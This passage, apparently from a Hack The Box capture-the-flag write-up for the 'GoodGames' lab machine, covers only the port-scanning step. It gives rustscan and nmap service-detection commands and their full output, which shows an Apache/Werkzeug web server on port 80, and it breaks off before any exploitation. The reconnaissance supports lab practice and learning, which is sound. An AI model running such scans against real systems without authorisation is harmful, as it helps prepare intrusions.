@@ -1,0 +1,1144 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Good Games</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="aff116d4-d2c7-413f-919b-89712f5ad019" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="Good%20Games%2015cfb/g-removebg-preview.png"/></div><h1 class="page-title">Good Games</h1><table class="properties"><tbody><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>OS</th><td>Linux</td></tr><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>IP</th><td>10.10.11.130</td></tr><tr class="property-row property-row-checkbox"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCheckbox"><path d="M0,3 C0,1.34314 1.34326,0 3,0 L11,0 C12.6567,0 14,1.34314 14,3 L14,11 C14,12.6569 12.6567,14 11,14 L3,14 C1.34326,14 0,12.6569 0,11 L0,3 Z M3,1.5 C2.17139,1.5 1.5,2.17157 1.5,3 L1.5,11 C1.5,11.8284 2.17139,12.5 3,12.5 L11,12.5 C11.8286,12.5 12.5,11.8284 12.5,11 L12.5,3 C12.5,2.17157 11.8286,1.5 11,1.5 L3,1.5 Z M2.83252,6.8161 L3.39893,6.27399 L3.57617,6.10425 L3.92334,5.77216 L4.26904,6.10559 L4.44531,6.27582 L5.58398,7.37402 L9.28271,3.81073 L9.45996,3.64008 L9.80664,3.3056 L10.1538,3.63989 L10.3311,3.81067 L10.8936,4.35303 L11.0708,4.52399 L11.4434,4.88379 L11.0708,5.24353 L10.8936,5.41437 L6.1084,10.0291 L5.93115,10.2 L5.58398,10.5344 L5.23682,10.2 L5.05957,10.0292 L2.83057,7.87946 L2.65283,7.70801 L2.27832,7.34674 L2.6543,6.98694 L2.83252,6.8161 Z"></path></svg></span>Complete</th><td><div class="checkbox checkbox-on"></div></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>OSCP</th><td><span class="selected-value select-value-color-yellow">no</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>Status</th><td><span class="selected-value select-value-color-red">Cracked</span></td></tr></tbody></table></header><div class="page-body"><figure id="aeef01a1-5229-4a26-9433-d1f2edabb04e"><a href="https://app.hackthebox.com/profile/355204" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box</div></div><div class="bookmark-href"><img src="https://app.hackthebox.com/images/HTB-favicon/favicon.ico" class="icon bookmark-icon"/>https://app.hackthebox.com/profile/355204</div></div></a><figcaption>Profile</figcaption></figure><p id="ff7ace63-d58e-475a-84a5-d0de3690de11" class="">
+</p><figure id="dee91c46-3a51-44ae-8b3d-64f621b7d073"><a href="https://kshitijraj.vercel.app/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Kshitij Protfolio Website</div><div class="bookmark-description">CyberSecurity Enthusiast and Researcher Tweaking around machine and finding a way to inside them. Basically I do Pentesting and do research on bugs . I do CTF challanges on different platform , learn about different vulnerability and trying to contribute to make cyberspace a safe place .</div></div><div class="bookmark-href"><img src="https://kshitijraj.vercel.app/favicon/favicon-16x16.png" class="icon bookmark-icon"/>https://kshitijraj.vercel.app/</div></div><img src="https://kshitijraj.vercel.app/img/Kshitij2%20(Custom).jpg" class="bookmark-image"/></a><figcaption>Website</figcaption></figure><h1 id="b3c590ef-f709-4789-b483-496f77a7e447" class="">1.Port Scanning</h1><pre id="2f349c51-708b-47cc-9ec7-7e9c17544560" class="code"><code>rustscan -a goodgames.htb -- -sC -sV</code></pre><p id="9b31c90a-e819-43ec-8fe2-e1ab3d489bb9" class="">
+</p><p id="1624d6bd-3571-4315-94fc-b2cf7124babe" class="">Result of scan</p><pre id="95b99bf1-5ae1-4b6c-ba92-afc0c827c487" class="code"><code>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at &quot;/home/ezio/.rustscan.toml&quot;
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. 
+Open 10.10.11.130:80
+[~] Starting Script(s)
+[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 17:28 GMT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 17:28
+Completed NSE at 17:28, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 17:28
+Completed NSE at 17:28, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 17:28
+Completed NSE at 17:28, 0.00s elapsed
+Initiating Ping Scan at 17:28
+Scanning 10.10.11.130 [2 ports]
+Completed Ping Scan at 17:28, 0.22s elapsed (1 total hosts)
+Initiating Connect Scan at 17:28
+Scanning goodgames.htb (10.10.11.130) [1 port]
+Discovered open port 80/tcp on 10.10.11.130
+Completed Connect Scan at 17:28, 0.20s elapsed (1 total ports)
+Initiating Service scan at 17:28
+Scanning 1 service on goodgames.htb (10.10.11.130)
+Completed Service scan at 17:29, 7.29s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.11.130.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 4.04s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 0.81s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 0.00s elapsed
+Nmap scan report for goodgames.htb (10.10.11.130)
+Host is up, received syn-ack (0.22s latency).
+Scanned at 2022-02-25 17:28:56 GMT for 12s
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.51
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-title: GoodGames | Community and Store
+|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 17:29
+Completed NSE at 17:29, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds</code></pre><p id="2766c0c6-6194-4a96-b51c-bfe3e1442312" class="">Found only one port </p><p id="188644b3-3b46-4fef-96a3-8490fc8c18c1" class="">Now Lets try with nmap </p><p id="59b4fec9-fa43-442a-ab3b-27e803bfbc1b" class="">
+</p><pre id="f688d0cf-58a6-4095-874d-accea6e31668" class="code"><code>nmap -sC -sV goodgames.htb -oN goodgames</code></pre><pre id="4eaf7979-b787-4fc1-abe3-64c003fc5ca5" class="code"><code>starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 17:36 GMT
+Nmap scan report for goodgames.htb (10.10.11.130)
+Host is up (0.20s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.05 seconds</code></pre><p id="bb705545-c213-4d89-9d40-3ece8df4669c" class="">Found a same port lets try enumerate this </p><p id="b05cca59-b586-4a42-9ac5-f3e5b1f86ec0" class="">
+</p><hr id="cf594aa6-e52f-45ae-901f-f7e399c6ecad"/><p id="e982a7ec-5d84-41d7-9f61-53116bbeed08" class="">
